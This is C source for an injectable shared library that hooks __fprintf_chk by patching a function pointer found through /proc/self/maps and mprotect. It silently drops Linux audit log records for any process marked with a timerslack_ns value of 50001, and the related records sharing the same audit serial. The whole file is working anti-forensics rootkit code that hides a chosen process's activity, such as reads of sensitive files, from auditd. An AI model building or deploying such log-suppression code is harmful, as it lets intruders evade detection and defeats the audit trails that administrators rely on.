#define _GNU_SOURCE

#include "mlog.h"

#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <string.h>
#include <sys/personality.h>
#include <sys/types.h>
#include <sys/mman.h>

typedef int (*__fprintf_chk_t)(FILE *stream, int flag, const char *fmt, ...);
static __fprintf_chk_t real_fprintf_chk = NULL;

void __attribute__ ((constructor)) library_init(void);
static int our__fprintf_chk (FILE *stream, int flag, const char *fmt, ...);
static int proc_is_marked(pid_t pid);


#define PIDEQ "pid="

static void* find_address_ref(void* addr, void** base, size_t *len) {
  void* ret = NULL;
  FILE* fp;
  int rc;
  void *start;
  void *end;
  char *prot = NULL;
  char *file = NULL;
  size_t size;
  uint64_t needle;

  needle = le64toh((uint64_t)addr);
  fp = fopen("/proc/self/maps", "r");
  if (!fp) {
    goto out;
  }
  rc = 1;
  while (rc > 0 && rc != EOF) {
    rc = fscanf(fp, "%llx-%llx %ms %*x %*s %*x %ms",
		(long long unsigned int*)&start,
		(long long unsigned int*)&end,
		&prot, &file);
    size = end - start;
    mlog(LINFO, "start: %8p\tend: %8p\tsize: %ld\tprot=%s\tfile=%s", start, end, size, prot, file);
    if (prot[0] != 'r') {
      continue;
    }
    ret = memmem(start, size, &needle, sizeof(needle));
    if (ret) {
      mlog(LPASS, "found ref to %p at %p (baseaddr %p) %s", addr, ret, start, prot);
      if (base) {
	*base = start;
      }
      if (len) {
	*len = size;
      }
      goto out;
    }
  }

 out:
  if (prot) {
    free(prot);
  }
  return ret;
}

void library_init(void) {
  void *base = NULL;
  void *entry;
  size_t len = 0;
  int rc;

  log_init("injected");

  mlog(LPASS, "library_init start");

  real_fprintf_chk = dlsym(RTLD_NEXT, "__fprintf_chk");
  if (real_fprintf_chk == NULL) {
    mlog(LFAIL, "couldn't resolve __fprintf_chk");
    goto out;
  }
  mlog(LINFO, "__fprintf_chk detected at %p", real_fprintf_chk);

  entry = find_address_ref(real_fprintf_chk, &base, &len);
  if (entry == NULL) {
    mlog(LFAIL, "couldn't find __fprintf_chk");
  }
  mlog(LINFO, "entry at %p", entry);
  mlog(LINFO, "mprotecting to read/write");
  rc = mprotect(base, len, PROT_READ | PROT_WRITE);
  if (rc) {
    mlog(LFAIL, "mprotect failed");
    goto out;
  }
  *(uint64_t*)entry = (uint64_t)our__fprintf_chk;
  mlog(LINFO, "mprotecting back to readonly");
  rc = mprotect(base, len, PROT_READ);
  if (rc) {
    mlog(LFAIL, "mprotect failed");
    goto out;
  }
  mlog(LPASS, "library_init end");

 out:
  return;
}

static int proc_is_marked(pid_t pid)
{
    FILE *procpidtimerslack;
    unsigned long timerslack;
    char buf[256];
    int rc = -1;


    snprintf(buf, sizeof(buf), "/proc/%d/timerslack_ns", pid);
    procpidtimerslack = fopen(buf, "r");
    if (procpidtimerslack == NULL) {
      mlog(LFAIL, "fopen: %s", strerror(errno));
      goto out;
    }
    if (fgets(buf, sizeof(buf), procpidtimerslack) == NULL) {
      mlog(LFAIL, "fgets: %s", strerror(errno));
      goto out;
    }
    timerslack = strtoul(buf, NULL, 10);
    if (timerslack == 50001) {
      rc = 1;
    } else {
      rc = 0;
    }

 out:
    if (procpidtimerslack) {
      (void)fclose(procpidtimerslack);
    }
    return rc;
}

static unsigned long getserial(char *s)
{
  char *needle;
  unsigned long rc = 0;

  mlog(LINFO, "serial");

  /*
   *  type=SYSCALL msg=audit(1364481363.243:24287): arch=c000003e syscall=2 success=no exit=-13 a0=7fffd19c5592 a1=0 a2=7fffd19c4b50 a3=a items=1 ppid=2686 pid=3538 auid=500 uid=500 gid=500 euid=500 suid=500 fsuid=500 egid=500 sgid=500 fsgid=500 tty=pts0 ses=1 comm="cat" exe="/bin/cat" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="sshd_config"
   *  type=CWD msg=audit(1364481363.243:24287):  cwd="/home/shadowman"
   *  type=PATH msg=audit(1364481363.243:24287): item=0 name="/etc/ssh/sshd_config" inode=409248 dev=fd:00 mode=0100600 ouid=0 ogid=0 rdev=00:00 obj=system_u:object_r:etc_t:s0
   */
  needle = strstr(s, "msg=audit(");
  if (needle == NULL) {
    goto out;
  }
  needle = index(s, ':');
  if (needle == NULL) {
    goto out;
  }
  needle++;
  if (*needle == 0) {
    goto out;
  }
  /* needle points to the serial number */
  rc = strtoul(needle, NULL, 10);

 out:
  return rc;
}

static int our__fprintf_chk (FILE *stream, int flag, const char *fmt, ...)
{
    va_list ap;
    char *buf;
    int rc;
    char *needle;
    static unsigned long marked_serial = 0;
    unsigned long serial;

    va_start (ap, fmt);
    rc = vasprintf(&buf, fmt, ap);
    va_end (ap);

    if (buf == NULL) {
        goto out;
    }
    serial = getserial(buf);
    mlog(LINFO, "serial: %u", serial);
    if (serial == marked_serial) {
      /* eat the message */
      mlog(LPASS, "serial matched %u, eating '%s'", marked_serial, buf);
      goto out;
    }
    marked_serial = 0;

    needle = strstr(buf, PIDEQ);
    if (needle) {
        pid_t pid;

        needle += strlen(PIDEQ);
        pid = strtoul(needle, NULL, 10);
	if (proc_is_marked(pid)) {
            /* eat the message */
            mlog(LPASS, "eating '%s'", buf);
	    marked_serial = serial;
            goto out;
        }
    }
    rc = fwrite(buf, 1, rc, stream);

 out:
    if (buf) {
        free(buf);
    }
    return rc;
}
